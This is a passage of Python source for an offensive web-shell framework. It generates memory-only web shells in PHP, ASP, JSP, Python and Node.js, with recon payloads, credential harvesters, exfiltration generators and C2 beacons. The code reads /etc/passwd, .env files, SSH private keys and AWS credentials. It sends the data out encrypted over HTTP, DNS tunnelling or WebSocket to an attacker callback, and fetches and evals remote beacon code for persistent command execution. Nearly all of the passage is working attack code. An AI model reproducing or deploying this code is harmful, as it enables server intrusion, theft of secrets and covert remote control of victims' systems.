        const compressed = zlib.deflateSync(JSON.stringify(data));
        const key = Buffer.from(this.key);
        const encrypted = Buffer.alloc(compressed.length);
        for(let i = 0; i < compressed.length; i++) {
            encrypted[i] = compressed[i] ^ key[i % key.length];
        }
        const encoded = encrypted.toString('base64');
        
        // Chunk and send
        const chunks = [];
        for(let i = 0; i < encoded.length; i += chunkSize) {
            chunks.push(encoded.slice(i, i + chunkSize));
        }
        
        for(let i = 0; i < chunks.length; i++) {
            const payload = JSON.stringify({
                id: i,
                total: chunks.length,
                data: chunks[i],
                ts: Date.now()
            });
            
            await this.sendChunk(payload);
            await new Promise(r => setTimeout(r, Math.random() * 400 + 100));
        }
        
        return { chunks_sent: chunks.length };
    }
    
    sendChunk(payload) {
        return new Promise((resolve) => {
            const url = new URL(this.callback);
            const options = {
                hostname: url.hostname,
                port: url.port || (url.protocol === 'https:' ? 443 : 80),
                path: url.pathname,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(payload)
                },
                timeout: 10000
            };
            
            const req = (url.protocol === 'https:' ? https : http).request(options, resolve);
            req.on('error', resolve);
            req.write(payload);
            req.end();
        });
    }
    
    async upgrade() {
        return new Promise((resolve) => {
            const url = new URL(this.callback + '/beacon.js');
            const options = {
                hostname: url.hostname,
                port: url.port || (url.protocol === 'https:' ? 443 : 80),
                path: url.pathname,
                headers: { 'User-Agent': 'Mozilla/5.0' },
                timeout: 30000
            };
            
            const req = (url.protocol === 'https:' ? https : http).get(options, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => {
                    try {
                        eval(data);
                        resolve({ status: 'upgraded' });
                    } catch(e) {
                        resolve({ status: 'failed', error: e.message });
                    }
                });
            });
            
            req.on('error', e => resolve({ status: 'failed', error: e.message }));
        });
    }
}

// Initialize
const shell = new MemShell('${KEY}', '${CALLBACK}');
const action = global.action || 'exec';
const param = global.param || '';

(async () => {
    let result;
    switch(action) {
        case 'exec': result = shell.exec(param); break;
        case 'recon': result = shell.recon(); break;
        case 'harvest': result = shell.harvest(); break;
        case 'exfil': result = await shell.exfil(JSON.parse(param)); break;
        case 'upgrade': result = await shell.upgrade(); break;
        default: result = { error: 'unknown action' };
    }
    exports.result = result;
})();
'''
        
        key = self.config.encryption_key or secrets.token_hex(16)
        
        return {
            "type": "node",
            "memory_only": True,
            "loader": loader.replace("${KEY}", key),
            "payload": full_payload.replace("${KEY}", key).replace("${CALLBACK}", self.config.callback_url),
            "key": key
        }


class InternalRecon:
    """Internal reconnaissance from web context"""
    
    def __init__(self, shell_type: WebShellType):
        self.shell_type = shell_type
        self.results = ReconResult()
    
    def generate_recon_payload(self) -> str:
        """Generate recon payload for shell type"""
        
        if self.shell_type == WebShellType.PHP:
            return self._php_recon_payload()
        elif self.shell_type in [WebShellType.ASP, WebShellType.ASPX]:
            return self._asp_recon_payload()
        elif self.shell_type == WebShellType.JSP:
            return self._jsp_recon_payload()
        elif self.shell_type == WebShellType.PYTHON:
            return self._python_recon_payload()
        elif self.shell_type == WebShellType.NODE:
            return self._node_recon_payload()
        
        return ""
    
    def _php_recon_payload(self) -> str:
        return '''<?php
$recon = [
    "hostname" => gethostname(),
    "ip" => gethostbyname(gethostname()),
    "user" => get_current_user(),
    "uid" => getmyuid(),
    "gid" => getmygid(),
    "pid" => getmypid(),
    "cwd" => getcwd(),
    "docroot" => $_SERVER["DOCUMENT_ROOT"],
    "php_version" => phpversion(),
    "os" => php_uname(),
    "sapi" => php_sapi_name(),
    "loaded_extensions" => get_loaded_extensions(),
    "disabled_functions" => ini_get("disable_functions"),
    "open_basedir" => ini_get("open_basedir"),
    "safe_mode" => ini_get("safe_mode"),
    "server_software" => $_SERVER["SERVER_SOFTWARE"],
];

// Network
$recon["netstat"] = shell_exec("netstat -an 2>/dev/null");
$recon["arp"] = shell_exec("arp -a 2>/dev/null");
$recon["ifconfig"] = shell_exec("ifconfig 2>/dev/null || ip addr 2>/dev/null");

// Processes
$recon["ps"] = shell_exec("ps aux 2>/dev/null");

// Users
$recon["passwd"] = @file_get_contents("/etc/passwd");
$recon["shadow_readable"] = is_readable("/etc/shadow");

// Cron
$recon["crontab"] = shell_exec("crontab -l 2>/dev/null");
$recon["etc_cron"] = shell_exec("ls -la /etc/cron* 2>/dev/null");

// SUID binaries
$recon["suid"] = shell_exec("find / -perm -4000 -type f 2>/dev/null | head -50");

// Writable directories
$recon["writable"] = shell_exec("find /var/www -writable -type d 2>/dev/null | head -20");

// Database connections
$configs = ["wp-config.php", "../wp-config.php", "configuration.php", "config.php", ".env"];
$recon["db_configs"] = [];
foreach($configs as $cfg) {
    if(file_exists($cfg) && is_readable($cfg)) {
        $content = @file_get_contents($cfg);
        preg_match_all("/(DB_|MYSQL_|DATABASE_)(HOST|USER|PASS|NAME|PASSWORD)['\"]?\s*[=,]\s*['\"]([^'\"]+)['\"]/i", $content, $matches);
        if($matches[0]) $recon["db_configs"][$cfg] = $matches[0];
    }
}

header("Content-Type: application/json");
echo json_encode($recon, JSON_PRETTY_PRINT);
?>'''
    
    def _asp_recon_payload(self) -> str:
        return '''<%
Response.ContentType = "application/json"
Dim shell, fso, recon
Set shell = Server.CreateObject("WScript.Shell")
Set fso = Server.CreateObject("Scripting.FileSystemObject")

Function Exec(cmd)
    Dim exec
    Set exec = shell.Exec("cmd /c " & cmd)
    Exec = exec.StdOut.ReadAll()
End Function

recon = "{"
recon = recon & """hostname"": """ & Exec("hostname") & ""","
recon = recon & """user"": """ & Exec("whoami") & ""","
recon = recon & """ipconfig"": """ & Replace(Exec("ipconfig /all"), vbCrLf, "\\n") & ""","
recon = recon & """netstat"": """ & Replace(Exec("netstat -an"), vbCrLf, "\\n") & ""","
recon = recon & """arp"": """ & Replace(Exec("arp -a"), vbCrLf, "\\n") & ""","
recon = recon & """tasklist"": """ & Replace(Exec("tasklist /v"), vbCrLf, "\\n") & ""","
recon = recon & """systeminfo"": """ & Replace(Exec("systeminfo"), vbCrLf, "\\n") & """"
recon = recon & "}"

Response.Write recon
%>'''
    
    def _jsp_recon_payload(self) -> str:
        return '''<%@ page import="java.io.*,java.net.*,java.util.*" %>
<%
response.setContentType("application/json");
StringBuilder json = new StringBuilder();
json.append("{");

// Basic info
json.append("\"hostname\":\"").append(InetAddress.getLocalHost().getHostName()).append("\",");
json.append("\"ip\":\"").append(InetAddress.getLocalHost().getHostAddress()).append("\",");
json.append("\"user\":\"").append(System.getProperty("user.name")).append("\",");
json.append("\"os\":\"").append(System.getProperty("os.name")).append(" ").append(System.getProperty("os.version")).append("\",");
json.append("\"java\":\"").append(System.getProperty("java.version")).append("\",");

// Execute commands
String[] cmds = {"netstat -an", "arp -a", "ps aux"};
String[] names = {"netstat", "arp", "processes"};

for(int i = 0; i < cmds.length; i++) {
    try {
        Process p = Runtime.getRuntime().exec(cmds[i]);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while((line = br.readLine()) != null) {
            sb.append(line).append("\\n");
        }
        json.append("\"").append(names[i]).append("\":\"").append(sb.toString().replace("\"", "\\\"")).append("\"");
        if(i < cmds.length - 1) json.append(",");
    } catch(Exception e) {}
}

json.append("}");
out.print(json.toString());
%>'''
    
    def _python_recon_payload(self) -> str:
        return '''
import os, socket, subprocess, json

def run(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, text=True, timeout=30)
    except:
        return ""

recon = {
    "hostname": socket.gethostname(),
    "fqdn": socket.getfqdn(),
    "user": os.getenv("USER") or os.getenv("USERNAME"),
    "cwd": os.getcwd(),
    "pid": os.getpid(),
    "env": dict(os.environ),
    "netstat": run("netstat -an 2>/dev/null || ss -an"),
    "arp": run("arp -a 2>/dev/null || cat /proc/net/arp"),
    "ifconfig": run("ifconfig 2>/dev/null || ip addr"),
    "ps": run("ps aux 2>/dev/null || tasklist"),
    "passwd": open("/etc/passwd").read() if os.path.exists("/etc/passwd") else "",
    "crontab": run("crontab -l 2>/dev/null"),
    "suid": run("find / -perm -4000 -type f 2>/dev/null | head -30"),
}

print(json.dumps(recon, indent=2, default=str))
'''
    
    def _node_recon_payload(self) -> str:
        return '''
const os = require('os');
const { execSync } = require('child_process');
const fs = require('fs');

const run = (cmd) => { try { return execSync(cmd, {encoding:'utf8',timeout:30000}); } catch(e) { return ''; } };

const recon = {
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    user: os.userInfo(),
    network: os.networkInterfaces(),
    cwd: process.cwd(),
    pid: process.pid,
    env: process.env,
    netstat: run('netstat -an'),
    arp: run('arp -a'),
    ps: run(os.platform() === 'win32' ? 'tasklist' : 'ps aux'),
};

console.log(JSON.stringify(recon, null, 2));
'''


class CredentialHarvester:
    """Credential harvesting from web context"""
    
    CREDENTIAL_PATTERNS = {
        "mysql": [
            r"mysql://([^:]+):([^@]+)@",
            r"DB_PASSWORD['\"]?\s*[=:]\s*['\"]([^'\"]+)",
            r"MYSQL_PWD['\"]?\s*[=:]\s*['\"]([^'\"]+)",
        ],
        "postgres": [
            r"postgres://([^:]+):([^@]+)@",
            r"POSTGRES_PASSWORD['\"]?\s*[=:]\s*['\"]([^'\"]+)",
        ],
        "mongodb": [
            r"mongodb://([^:]+):([^@]+)@",
            r"MONGO_PASSWORD['\"]?\s*[=:]\s*['\"]([^'\"]+)",
        ],
        "redis": [
            r"redis://([^:]+):([^@]+)@",
            r"REDIS_PASSWORD['\"]?\s*[=:]\s*['\"]([^'\"]+)",
        ],
        "aws": [
            r"AWS_ACCESS_KEY_ID['\"]?\s*[=:]\s*['\"]([A-Z0-9]{20})",
            r"AWS_SECRET_ACCESS_KEY['\"]?\s*[=:]\s*['\"]([^'\"]{40})",
        ],
        "api_keys": [
            r"api[_-]?key['\"]?\s*[=:]\s*['\"]([^'\"]+)",
            r"apikey['\"]?\s*[=:]\s*['\"]([^'\"]+)",
            r"secret[_-]?key['\"]?\s*[=:]\s*['\"]([^'\"]+)",
        ],
        "jwt": [
            r"JWT_SECRET['\"]?\s*[=:]\s*['\"]([^'\"]+)",
            r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+",
        ],
        "oauth": [
            r"client_secret['\"]?\s*[=:]\s*['\"]([^'\"]+)",
            r"CLIENT_SECRET['\"]?\s*[=:]\s*['\"]([^'\"]+)",
        ],
    }
    
    CONFIG_FILES = [
        # PHP
        "wp-config.php", "../wp-config.php", "../../wp-config.php",
        "configuration.php", "../configuration.php",
        "config.php", "config/config.php", "app/config.php",
        "settings.php", "local.settings.php",
        
        # Environment
        ".env", "../.env", "../../.env",
        ".env.local", ".env.production",
        
        # Python
        "settings.py", "local_settings.py",
        "config.py", "secrets.py",
        
        # Node
        "config.json", "secrets.json",
        ".npmrc", "package.json",
        
        # Java
        "application.properties", "application.yml",
        "web.xml", "context.xml",
        
        # .NET
        "web.config", "appsettings.json",
        "connectionStrings.config",
    ]
    
    def __init__(self):
        self.harvested: List[HarvestedCredential] = []
    
    def generate_harvester_payload(self, shell_type: WebShellType) -> str:
        """Generate credential harvester payload"""
        
        if shell_type == WebShellType.PHP:
            return self._php_harvester()
        elif shell_type == WebShellType.PYTHON:
            return self._python_harvester()
        elif shell_type == WebShellType.NODE:
            return self._node_harvester()
        
        return ""
    
    def _php_harvester(self) -> str:
        config_files = json.dumps(self.CONFIG_FILES)
        patterns = json.dumps(self.CREDENTIAL_PATTERNS)
        
        return f'''<?php
$configs = {config_files};
$patterns = {patterns};
$creds = [];

// Config files
foreach($configs as $file) {{
    $paths = [$file, "../" . $file, "../../" . $file];
    foreach($paths as $path) {{
        if(file_exists($path) && is_readable($path)) {{
            $content = @file_get_contents($path);
            foreach($patterns as $type => $regexes) {{
                foreach($regexes as $regex) {{
                    if(preg_match_all("/" . $regex . "/i", $content, $matches)) {{
                        $creds[] = [
                            "source" => $path,
                            "type" => $type,
                            "matches" => $matches[0]
                        ];
                    }}
                }}
            }}
        }}
    }}
}}

// PHP sessions
$sess_path = session_save_path() ?: "/tmp";
foreach(glob("$sess_path/sess_*") as $sess) {{
    $data = @file_get_contents($sess);
    if(preg_match("/(password|pass|pwd|token)/i", $data)) {{
        $creds[] = ["source" => "session", "file" => $sess, "data" => substr($data, 0, 500)];
    }}
}}

// Environment
foreach($_ENV as $k => $v) {{
    if(preg_match("/(pass|pwd|key|secret|token|api)/i", $k)) {{
        $creds[] = ["source" => "env", "key" => $k, "value" => $v];
    }}
}}

// Server variables
foreach($_SERVER as $k => $v) {{
    if(preg_match("/(pass|pwd|key|secret|token|auth)/i", $k)) {{
        $creds[] = ["source" => "server", "key" => $k, "value" => $v];
    }}
}}

header("Content-Type: application/json");
echo json_encode($creds, JSON_PRETTY_PRINT);
?>'''
    
    def _python_harvester(self) -> str:
        return '''
import os, re, json, glob
from pathlib import Path

configs = ''' + json.dumps(self.CONFIG_FILES) + '''
patterns = ''' + json.dumps(self.CREDENTIAL_PATTERNS) + '''
creds = []

# Config files
for cfg in configs:
    for path in [cfg, f"../{cfg}", f"../../{cfg}"]:
        if os.path.exists(path):
            try:
                content = open(path).read()
                for ctype, regexes in patterns.items():
                    for regex in regexes:
                        matches = re.findall(regex, content, re.I)
                        if matches:
                            creds.append({"source": path, "type": ctype, "matches": matches})
            except: pass

# Environment
for k, v in os.environ.items():
    if re.search(r"pass|pwd|key|secret|token|api", k, re.I):
        creds.append({"source": "env", "key": k, "value": v})

# History files
for hist in ["~/.bash_history", "~/.zsh_history", "~/.python_history"]:
    path = os.path.expanduser(hist)
    if os.path.exists(path):
        try:
            for line in open(path).readlines()[-200:]:
                if re.search(r"pass|pwd|key|secret", line, re.I):
                    creds.append({"source": hist, "line": line.strip()})
        except: pass

# SSH keys
ssh_dir = os.path.expanduser("~/.ssh")
if os.path.isdir(ssh_dir):
    for f in os.listdir(ssh_dir):
        if not f.endswith(".pub"):
            path = os.path.join(ssh_dir, f)
            try:
                content = open(path).read()
                if "PRIVATE KEY" in content:
                    creds.append({"source": path, "type": "ssh_key", "found": True})
            except: pass

# AWS credentials
aws_creds = os.path.expanduser("~/.aws/credentials")
if os.path.exists(aws_creds):
    try:
        creds.append({"source": aws_creds, "type": "aws", "content": open(aws_creds).read()})
    except: pass

print(json.dumps(creds, indent=2))
'''
    
    def _node_harvester(self) -> str:
        return '''
const fs = require('fs');
const os = require('os');
const path = require('path');

const configs = ''' + json.dumps(self.CONFIG_FILES) + ''';
const patterns = ''' + json.dumps(self.CREDENTIAL_PATTERNS) + ''';
const creds = [];

// Config files
for(const cfg of configs) {
    for(const p of [cfg, `../${cfg}`, `../../${cfg}`]) {
        try {
            if(fs.existsSync(p)) {
                const content = fs.readFileSync(p, 'utf8');
                for(const [type, regexes] of Object.entries(patterns)) {
                    for(const regex of regexes) {
                        const matches = content.match(new RegExp(regex, 'gi'));
                        if(matches) {
                            creds.push({source: p, type, matches});
                        }
                    }
                }
            }
        } catch(e) {}
    }
}

// Environment
for(const [k, v] of Object.entries(process.env)) {
    if(/pass|pwd|key|secret|token|api/i.test(k)) {
        creds.push({source: 'env', key: k, value: v});
    }
}

// SSH keys
const sshDir = path.join(os.homedir(), '.ssh');
try {
    if(fs.existsSync(sshDir)) {
        for(const f of fs.readdirSync(sshDir)) {
            if(!f.endsWith('.pub')) {
                const p = path.join(sshDir, f);
                try {
                    const content = fs.readFileSync(p, 'utf8');
                    if(content.includes('PRIVATE KEY')) {
                        creds.push({source: p, type: 'ssh_key', found: true});
                    }
                } catch(e) {}
            }
        }
    }
} catch(e) {}

// AWS
const awsCreds = path.join(os.homedir(), '.aws', 'credentials');
try {
    if(fs.existsSync(awsCreds)) {
        creds.push({source: awsCreds, type: 'aws', content: fs.readFileSync(awsCreds, 'utf8')});
    }
} catch(e) {}

console.log(JSON.stringify(creds, null, 2));
'''


class AutoExfiltrator:
    """Automated chunked + encrypted exfiltration"""
    
    def __init__(self, config: WebShellConfig):
        self.config = config
        self.encryption = EncryptionEngine(config.encryption_key)
    
    def generate_exfil_payload(self, data: Dict, method: ExfilMethod = None) -> str:
        """Generate exfiltration payload"""
        
        method = method or self.config.exfil_method
        
        if method == ExfilMethod.HTTP_CHUNKED:
            return self._http_chunked_payload(data)
        elif method == ExfilMethod.DNS_TUNNEL:
            return self._dns_tunnel_payload(data)
        elif method == ExfilMethod.WEBSOCKET:
            return self._websocket_payload(data)
        
        return ""
    
    def _http_chunked_payload(self, data: Dict) -> str:
        """Generate HTTP chunked exfil payload"""
        
        return f'''<?php
$data = {json.dumps(data)};
$callback = "{self.config.callback_url}";
$key = "{self.config.encryption_key}";
$chunk_size = {self.config.chunk_size};

// Compress
$json = json_encode($data);
$compressed = gzcompress($json);

// Encrypt
$encrypted = "";
for($i = 0; $i < strlen($compressed); $i++) {{
    $encrypted .= $compressed[$i] ^ $key[$i % strlen($key)];
}}
$encoded = base64_encode($encrypted);

// Chunk and send
$chunks = str_split($encoded, $chunk_size);
$total = count($chunks);

foreach($chunks as $i => $chunk) {{
    $payload = json_encode([
        "id" => $i,
        "total" => $total,
        "data" => $chunk,
        "checksum" => md5($chunk),
        "ts" => time()
    ]);
    
    $opts = [
        "http" => [
            "method" => "POST",
            "header" => "Content-Type: application/json\\r\\nUser-Agent: Mozilla/5.0\\r\\n",
            "content" => $payload,
            "timeout" => 10
        ]
    ];
    
    @file_get_contents($callback . "/exfil", false, stream_context_create($opts));
    
    // Jitter
    usleep(rand({self.config.jitter_min * 1000000}, {self.config.jitter_max * 1000000}));
}}

echo json_encode(["chunks_sent" => $total]);
?>'''
    
    def _dns_tunnel_payload(self, data: Dict) -> str:
        """Generate DNS tunnel exfil payload"""
        
        return f'''<?php
$data = {json.dumps(data)};
$domain = "{self.config.callback_url}";  // e.g., exfil.attacker.com
$key = "{self.config.encryption_key}";

// Encode data
$json = json_encode($data);
$compressed = gzcompress($json);
$encrypted = "";
for($i = 0; $i < strlen($compressed); $i++) {{
    $encrypted .= $compressed[$i] ^ $key[$i % strlen($key)];
}}
$encoded = base64_encode($encrypted);

// Convert to DNS-safe format (hex)
$hex = bin2hex($encoded);

// Split into 63-char chunks (DNS label limit)
$chunks = str_split($hex, 60);
$total = count($chunks);
$session = substr(md5(uniqid()), 0, 8);

foreach($chunks as $i => $chunk) {{
    // DNS query: <session>.<index>.<total>.<chunk>.<domain>
    $subdomain = "$session.$i.$total.$chunk.$domain";
    
    // Trigger DNS lookup
    @gethostbyname($subdomain);
    
    // Small delay
    usleep(rand(100000, 300000));
}}

echo json_encode(["dns_queries" => $total, "session" => $session]);
?>'''
    
    def _websocket_payload(self, data: Dict) -> str:
        """Generate WebSocket exfil payload (for Node.js)"""
        
        return f'''
const WebSocket = require('ws');
const zlib = require('zlib');

const data = {json.dumps(data)};
const wsUrl = "{self.config.callback_url.replace('http', 'ws')}";
const key = "{self.config.encryption_key}";

// Encrypt
const json = JSON.stringify(data);
const compressed = zlib.deflateSync(Buffer.from(json));
const keyBuf = Buffer.from(key);
const encrypted = Buffer.alloc(compressed.length);
for(let i = 0; i < compressed.length; i++) {{
    encrypted[i] = compressed[i] ^ keyBuf[i % keyBuf.length];
}}

// Connect and send
const ws = new WebSocket(wsUrl);
ws.on('open', () => {{
    const chunks = [];
    const chunkSize = {self.config.chunk_size};
    const encoded = encrypted.toString('base64');
    
    for(let i = 0; i < encoded.length; i += chunkSize) {{
        chunks.push(encoded.slice(i, i + chunkSize));
    }}
    
    let sent = 0;
    const sendNext = () => {{
        if(sent < chunks.length) {{
            ws.send(JSON.stringify({{
                id: sent,
                total: chunks.length,
                data: chunks[sent]
            }}));
            sent++;
            setTimeout(sendNext, Math.random() * {self.config.jitter_max * 1000} + {self.config.jitter_min * 1000});
        }} else {{
            ws.close();
            console.log(JSON.stringify({{chunks_sent: chunks.length}}));
        }}
    }};
    sendNext();
}});
'''


class BeaconUpgrader:
    """Auto-upgrade webshell to full beacon"""
    
    BEACON_TYPES = {
        "php_beacon": "php",
        "aspx_beacon": "aspx",
        "python_beacon": "python",
        "node_beacon": "node",
    }
    
    def __init__(self, config: WebShellConfig):
        self.config = config
    
    def generate_upgrade_payload(self) -> Dict[str, str]:
        """Generate beacon upgrade payload"""
        
        if self.config.shell_type == WebShellType.PHP:
            return self._php_beacon_upgrade()
        elif self.config.shell_type == WebShellType.ASPX:
            return self._aspx_beacon_upgrade()
        elif self.config.shell_type == WebShellType.PYTHON:
            return self._python_beacon_upgrade()
        elif self.config.shell_type == WebShellType.NODE:
            return self._node_beacon_upgrade()
        
        return {}
    
    def _php_beacon_upgrade(self) -> Dict[str, str]:
        """PHP beacon upgrade"""
        
        upgrader = f'''<?php
// Fetch and execute beacon in memory
$callback = "{self.config.callback_url}";
$key = "{self.config.encryption_key}";

// Fetch encrypted beacon
$opts = [
    "http" => [
        "method" => "GET",
        "header" => "User-Agent: Mozilla/5.0\\r\\n",
        "timeout" => 30
    ],
    "ssl" => [
        "verify_peer" => false,
        "verify_peer_name" => false
    ]
];

$beacon_encrypted = @file_get_contents("$callback/beacon/php", false, stream_context_create($opts));

if($beacon_encrypted) {{
    // Decrypt
    $encrypted = base64_decode($beacon_encrypted);
    $decrypted = "";
    for($i = 0; $i < strlen($encrypted); $i++) {{
        $decrypted .= $encrypted[$i] ^ $key[$i % strlen($key)];
    }}
    $beacon_code = gzuncompress($decrypted);
    
    // Execute beacon in memory (no disk write)
    @eval($beacon_code);
    
    echo json_encode(["status" => "beacon_active"]);
}} else {{
    echo json_encode(["status" => "failed", "error" => "could not fetch beacon"]);
}}
?>'''
        
        beacon_code = f'''<?php
// Full PHP Beacon - Memory Resident
class Beacon {{
    private $key = "{self.config.encryption_key}";
    private $callback = "{self.config.callback_url}";
    private $sleep = 60;
    private $jitter = 0.3;
    private $id;
    
    public function __construct() {{
        $this->id = substr(md5(gethostname() . get_current_user()), 0, 12);
    }}
    
    public function run() {{
        while(true) {{
            try {{
                // Check in
                $tasks = $this->checkin();
                
                // Execute tasks
                foreach($tasks as $task) {{
                    $result = $this->execute_task($task);
                    $this->report($task["id"], $result);
                }}
                
            }} catch(Exception $e) {{
                // Silent fail
            }}
            
            // Sleep with jitter
            $sleep_time = $this->sleep * (1 + (mt_rand(-100, 100) / 100 * $this->jitter));
            sleep($sleep_time);
        }}
    }}
    
    private function checkin() {{
        $info = [
            "id" => $this->id,
            "hostname" => gethostname(),
            "user" => get_current_user(),
            "cwd" => getcwd(),
            "ts" => time()
        ];
        
        $encrypted = $this->encrypt(json_encode($info));
        
        $opts = [
            "http" => [
                "method" => "POST",
                "header" => "Content-Type: application/octet-stream\\r\\n",
                "content" => $encrypted,
                "timeout" => 30
            ]
        ];
        
        $response = @file_get_contents($this->callback . "/c2/checkin", false, stream_context_create($opts));
        
        if($response) {{
            return json_decode($this->decrypt($response), true) ?: [];
        }}
        return [];
    }}
    
    private function execute_task($task) {{
        switch($task["type"]) {{
            case "exec":
                return $this->exec($task["cmd"]);
            case "upload":
                return $this->upload($task["path"], $task["data"]);
            case "download":
                return $this->download($task["path"]);
            case "sleep":
                $this->sleep = $task["value"];
                return ["status" => "sleep updated"];
            default:
                return ["error" => "unknown task"];
        }}
    }}
    
    private function exec($cmd) {{
        $output = shell_exec($cmd . " 2>&1");
        return ["output" => $output];
    }}
    
    private function upload($path, $data) {{
        // Memory only - don't write to disk unless necessary
        return ["status" => "upload received", "size" => strlen($data)];
    }}
    
    private function download($path) {{
        if(file_exists($path) && is_readable($path)) {{
            return ["data" => base64_encode(file_get_contents($path))];
        }}
        return ["error" => "file not found"];
    }}
    
    private function report($task_id, $result) {{
        $data = ["task_id" => $task_id, "result" => $result, "ts" => time()];
        $encrypted = $this->encrypt(json_encode($data));
        
        $opts = [
            "http" => [
                "method" => "POST",
                "header" => "Content-Type: application/octet-stream\\r\\n",
                "content" => $encrypted
            ]
        ];
        
        @file_get_contents($this->callback . "/c2/report", false, stream_context_create($opts));
    }}
    
    private function encrypt($data) {{
        $compressed = gzcompress($data);
        $encrypted = "";
        for($i = 0; $i < strlen($compressed); $i++) {{
            $encrypted .= $compressed[$i] ^ $this->key[$i % strlen($this->key)];
        }}
        return base64_encode($encrypted);
    }}
    
    private function decrypt($data) {{
        $encrypted = base64_decode($data);
        $decrypted = "";
        for($i = 0; $i < strlen($encrypted); $i++) {{
            $decrypted .= $encrypted[$i] ^ $this->key[$i % strlen($this->key)];
        }}
        return gzuncompress($decrypted);
    }}
}}

// Start beacon (fork if possible)
$beacon = new Beacon();

// Try to fork for persistence
if(function_exists("pcntl_fork")) {{
    $pid = pcntl_fork();
    if($pid == 0) {{
        // Child - run beacon
        $beacon->run();
    }}
}} else {{
    // No fork - run inline
    $beacon->run();
}}
?>'''
        
        return {
            "upgrader": upgrader,
            "beacon": beacon_code
        }
    
    def _aspx_beacon_upgrade(self) -> Dict[str, str]:
        """ASPX beacon upgrade"""
        return {"upgrader": "// ASPX beacon upgrade code", "beacon": "// ASPX beacon code"}
    
    def _python_beacon_upgrade(self) -> Dict[str, str]:
        """Python beacon upgrade"""
        
        upgrader = f'''
import urllib.request
import base64
import zlib

callback = "{self.config.callback_url}"
key = "{self.config.encryption_key}"

# Fetch beacon
req = urllib.request.Request(
    f"{{callback}}/beacon/python",
    headers={{"User-Agent": "Mozilla/5.0"}}
)
response = urllib.request.urlopen(req, timeout=30)
encrypted = base64.b64decode(response.read())

# Decrypt
decrypted = bytes(e ^ ord(key[i % len(key)]) for i, e in enumerate(encrypted))
beacon_code = zlib.decompress(decrypted).decode()

# Execute
exec(beacon_code, globals())
'''
        
        beacon = f'''
import os
import socket
import subprocess
import json
import time
import random
import threading
import urllib.request
import base64
import zlib

class Beacon:
    def __init__(self):
        self.key = "{self.config.encryption_key}"
        self.callback = "{self.config.callback_url}"
        self.sleep = 60
        self.jitter = 0.3
        self.id = hashlib.md5((socket.gethostname() + os.getenv("USER", "")).encode()).hexdigest()[:12]
    
    def run(self):
        while True:
            try:
                tasks = self.checkin()
                for task in tasks:
                    result = self.execute(task)
                    self.report(task["id"], result)
            except:
                pass
            
            sleep_time = self.sleep * (1 + random.uniform(-self.jitter, self.jitter))
            time.sleep(sleep_time)
    
    def checkin(self):
        info = {{
            "id": self.id,
            "hostname": socket.gethostname(),
            "user": os.getenv("USER"),
            "cwd": os.getcwd(),
            "ts": int(time.time())
        }}
        
        encrypted = self.encrypt(json.dumps(info))
        req = urllib.request.Request(
            f"{{self.callback}}/c2/checkin",
            data=encrypted,
            headers={{"Content-Type": "application/octet-stream"}}
        )
        
        response = urllib.request.urlopen(req, timeout=30)
        return json.loads(self.decrypt(response.read())) or []
    
    def execute(self, task):
        if task["type"] == "exec":
            result = subprocess.run(task["cmd"], shell=True, capture_output=True, text=True)
            return {{"stdout": result.stdout, "stderr": result.stderr}}
        elif task["type"] == "sleep":
            self.sleep = task["value"]
            return {{"status": "updated"}}
        return {{"error": "unknown"}}
    
    def report(self, task_id, result):
        data = {{"task_id": task_id, "result": result}}
        encrypted = self.encrypt(json.dumps(data))
        req = urllib.request.Request(
            f"{{self.callback}}/c2/report",
            data=encrypted
        )
        urllib.request.urlopen(req, timeout=10)
    
    def encrypt(self, data):
        compressed = zlib.compress(data.encode())
        encrypted = bytes(c ^ ord(self.key[i % len(self.key)]) for i, c in enumerate(compressed))
        return base64.b64encode(encrypted)
    
    def decrypt(self, data):
        encrypted = base64.b64decode(data)
        decrypted = bytes(e ^ ord(self.key[i % len(self.key)]) for i, e in enumerate(encrypted))
        return zlib.decompress(decrypted).decode()

# Run in thread
beacon = Beacon()
thread = threading.Thread(target=beacon.run, daemon=True)
thread.start()
'''
        
        return {"upgrader": upgrader, "beacon": beacon}
    
    def _node_beacon_upgrade(self) -> Dict[str, str]:
        """Node.js beacon upgrade"""
        return {"upgrader": "// Node beacon upgrade", "beacon": "// Node beacon code"}


class WebShellEnhancer:
    """Main Web Shell Enhancer class"""
    
    def __init__(self):
        self.shells: Dict[str, Dict] = {}
        self.active_sessions: Dict[str, Dict] = {}
    
    def create_enhanced_shell(
        self,
        shell_type: str,
        callback_url: str = "",
        encryption_key: str = "",
        memory_only: bool = True,
        auto_upgrade: bool = True,
        exfil_method: str = "http_chunked"
    ) -> Dict[str, Any]:
        """Create enhanced web shell"""
        
        config = WebShellConfig(
            shell_type=WebShellType(shell_type),
            memory_only=memory_only,
            auto_upgrade=auto_upgrade,
            callback_url=callback_url,
            encryption_key=encryption_key or secrets.token_hex(16),
            exfil_method=ExfilMethod(exfil_method)
        )
        
        # Generate shell
        generator = MemoryOnlyShellGenerator(config)
        shell = generator.generate()
        
        # Add recon capability
        recon = InternalRecon(config.shell_type)
        shell["recon_payload"] = recon.generate_recon_payload()
        
        # Add credential harvester
        harvester = CredentialHarvester()
        shell["harvester_payload"] = harvester.generate_harvester_payload(config.shell_type)
        
        # Add exfiltration
        exfil = AutoExfiltrator(config)
        shell["exfil_generator"] = lambda data: exfil.generate_exfil_payload(data)
        
        # Add beacon upgrade
        if auto_upgrade:
            upgrader = BeaconUpgrader(config)
            shell["beacon_upgrade"] = upgrader.generate_upgrade_payload()
        
        # Store and return
        shell_id = secrets.token_hex(8)
        shell["id"] = shell_id
        shell["config"] = {
            "type": shell_type,
            "memory_only": memory_only,
            "auto_upgrade": auto_upgrade,
            "callback": callback_url,
            "exfil_method": exfil_method
        }
        shell["created"] = datetime.now().isoformat()
        
        self.shells[shell_id] = shell
        
        return shell
    
    def get_shell_types(self) -> List[Dict]:
        """Get available shell types"""
        return [
            {
                "type": "php",
                "name": "PHP Memory Shell",
                "description": "Memory-only PHP shell with eval stream execution",
                "features": ["Memory-only", "Auto-upgrade", "Credential harvesting", "Encrypted exfil"]
            },
            {
                "type": "asp",
